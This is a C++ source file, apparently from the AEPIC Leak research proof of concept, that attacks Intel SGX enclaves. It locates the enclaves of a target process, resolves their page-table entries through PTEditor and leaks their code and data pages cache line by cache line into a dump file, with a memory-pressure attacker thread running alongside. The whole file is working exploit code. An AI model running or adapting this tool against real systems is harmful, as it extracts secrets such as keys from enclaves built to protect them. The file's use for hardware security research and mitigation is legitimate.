
#include "aepic_interface.h"
#include "aepic_leak.h"
#include "ptedit_header.h"
#include "utils.h"

#include <algorithm>
#include <array>
#include <atomic>
#include <cassert>
#include <condition_variable>
#include <ctype.h>
#include <fcntl.h>
#include <map>
#include <mutex>
#include <pthread.h>
#include <queue>
#include <set>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <x86intrin.h>

struct config_t {
    uint64_t    pid;
    uint64_t    eidx;
    bool        dump_code;
    bool        dump_data;
    bool        dump_non_present;
    bool        show;
    bool        readable;
    char const *file_name;

    bool parse(int argc, char *argv[]) {
        if ( argc != 5 ) {
            printf("usage: %s [pid] [eidx] [flags] [dump_file]\n", argv[0]);
            printf("flags: x=dump_code d=dump_data p=non_present s=show r=readable \n");
            return false;
        }

        pid  = atoi(argv[1]);
        eidx = atoi(argv[2]);

        dump_code        = strstr(argv[3], "x") != nullptr;
        dump_data        = strstr(argv[3], "d") != nullptr;
        dump_non_present = strstr(argv[3], "p") != nullptr;
        show             = strstr(argv[3], "s") != nullptr;
        readable         = strstr(argv[3], "r") != nullptr;

        file_name = argv[4];

        return true;
    }
};

static config_t       config;
static aepic_data_pid data;

// threads
pthread_t attacker_thread[2];

size_t encl_size() {
    return data.enclave_sizes[config.eidx];
}

char *encl_base() {
    return (char *)data.enclave_ids[config.eidx];
}

void *attacker_leaker(void *unused) {
    set_cpu_mask(1llu << ATTACKER_LEAKER);

    usleep(500 * 1000);
    uint8_t zeros[0x1000] = {};

    FILE *f = fopen(config.file_name, "wb");
    if ( !f ) {
        stop_execution();
        printf("couldn't open log file!");
        return NULL;
    }

    for ( size_t offset = 0; offset < encl_size() && running; offset += 0x1000 ) {

        auto     e   = ptedit_resolve(encl_base() + offset, data.pid);
        uint64_t pfn = (uint64_t)((e.pte >> 12) & ((1ull << 40) - 1));
        bool     nx  = PTEDIT_B(e.pte, PTEDIT_PAGE_BIT_NX);

        printf("leaking page %4lu/%4lu\r", offset / 0x1000, encl_size() / 0x1000);
        fflush(stdout);

        if ( pfn == 0 ) {
            if ( config.dump_non_present ) {
                fwrite(zeros, 0x1000, 1, f);
            }
            continue;
        }

        if ( nx && !config.dump_data ) {
            continue;
        }

        if ( !nx && !config.dump_code ) {
            continue;
        }

        if ( config.show ) {
            printf("\n");
        }

        for ( size_t line = 0; line < 64 && running; line += 2 ) {
            cache_line_t cl = leak_line_zero(data.pid, encl_base(), offset, line);

            if ( config.show ) {
                printf("%2lu → ", line);
                print_line(cl, false, config.readable);
            }
            fwrite(cl.data(), 64, 1, f);
            fwrite(zeros, 64, 1, f);
        }
    }
    printf("\ndone");

    fclose(f);

    stop_execution();
    printf("[attacker] thread finished!\n");
    return NULL;
}

void signal_handler(int sig) {
    if ( sig == SIGINT ) {
        stop_execution();
        printf("\nctrl+c handled\n");
    }
}

int main(int argc, char *argv[]) {

    if ( !config.parse(argc, argv) ) {
        return -1;
    }

    isgx = open("/dev/isgx", O_RDWR);
    if ( isgx < 0 ) {
        printf("[attacker] could not open isgx driver: sudo?\n");
        exit(-1);
    }

    if ( ptedit_init() ) {
        printf("Error: Could not initalize PTEditor, did you load the kernel module?\n");
        close(isgx);
        exit(-1);
    }

    data = aepic_get_data_pid(config.pid);

    printf("found %llu enclave(s) for pid %lu\n", data.enclaves, config.pid);

    for ( uint64_t i = 0; i < data.enclaves; ++i ) {
        printf("%2ld → enclave @ vadr 0x%llx with %llu pages\n", i, data.enclave_ids[i],
               data.enclave_sizes[i] / 0x1000);
    }
    if ( data.enclaves == 0 ) {
        printf("no enclaves found!\n");
        close(isgx);
        ptedit_cleanup();
        return -1;
    }

    if ( config.eidx == -1 ) {
        printf("enter enclave id to target!\n");
        scanf("%lu", &config.eidx);
    }

    if ( config.eidx < 0 || config.eidx >= data.enclaves ) {
        printf("no valid enclave index!\n");
        close(isgx);
        ptedit_cleanup();
        return -1;
    }

    // assert(signal(SIGSEGV, signal_handler) != SIG_ERR);
    assert(signal(SIGINT, signal_handler) != SIG_ERR);

    pthread_create(&attacker_thread[0], 0, attacker_leaker, NULL);
    pthread_create(&attacker_thread[1], 0, attacker_memory_pressure, NULL);

    pthread_join(attacker_thread[0], NULL);
    pthread_join(attacker_thread[1], NULL);

    close(isgx);
    ptedit_cleanup();

    printf("[main] finished\n");

    return 0;
}
